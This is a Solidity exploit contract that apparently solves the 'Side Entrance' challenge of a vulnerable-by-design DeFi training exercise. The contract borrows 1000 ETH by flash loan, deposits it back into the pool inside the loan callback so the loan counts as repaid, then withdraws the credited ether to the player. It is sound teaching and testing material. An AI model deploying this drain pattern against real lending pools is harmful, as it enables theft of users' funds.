// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SolveSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool immutable pool;
    address payable immutable player;

    constructor(SideEntranceLenderPool _pool, address payable _player) {
        pool = _pool;
        player = _player;
    }

    function solve() external {
        // get a flash loan of 1000 ETH
        pool.flashLoan(1000 ether); // now the execution will go to the `execute()`
        // withdraw 1000 ETH
        pool.withdraw(); // now the execution will go to the `receive()` function
    }

    // will be called automatically
    function execute() external override payable {
        // deposit the loan back into the pool
        pool.deposit{value: 1000 ether}();
    }

    // will be called automatically
    receive() external payable {
        // transfer 1000 ETH to player
        player.transfer(1000 ether);
    }
}
